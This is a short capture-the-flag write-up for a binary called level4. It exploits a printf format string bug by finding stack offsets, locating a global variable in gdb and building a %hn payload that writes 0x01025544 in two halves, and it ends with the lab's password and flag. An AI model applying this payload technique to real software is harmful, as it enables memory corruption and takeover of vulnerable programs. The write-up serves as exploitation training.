level4 : b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
Process:
    - ./level4
    - AAAA BBBB %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
    - we see that we can write on the 12 and 13 address (%12$x == 41414141 && %13$x == 42424242)
    - gdb ./level4
    - b *n
    - run
    - p &m = 0x8049810
    
    - m need to be equal to m == 0x1025544 = (decimal = 16930116 in hexadecimal = 0x1025544)
    - number to big so we need to write on 2 bytes (2 bytes low then 2 bytes high of address of m)
    - so for the low part of the address of m we access by 0x8049810 and for the high part by 0x8049812
    - in little endian it's  m = \x10\x98\x04\x08 and m+2 = \x12\x98\x04\x08
    - So we need to write 0x5544 at m and 0x0102 at m + 2

    - We will write two address of 4 bytes (8 bytes already write in printf),
      (0x5544 = 21828 in decimal) == %21820x%13$hn (21828 - 8 = 21820 bytes),
      (0x0102 = 258 in decimal) because 258 < 21828 (target_value < current_count)
      we need to use the wrap around = (target_value + 65536 - current_count) % 65536
      (258 + 65536 - 21828) % 65536 = 43966,
      we need to write %43966x%13$hn to put 0x0102 at m+2
    
    - python -c 'print("\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%21820x%12$hn%43966x%13$hn")' > /tmp/level4
    - cat /tmp/level4 - | ./level4
    - get the flag : 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a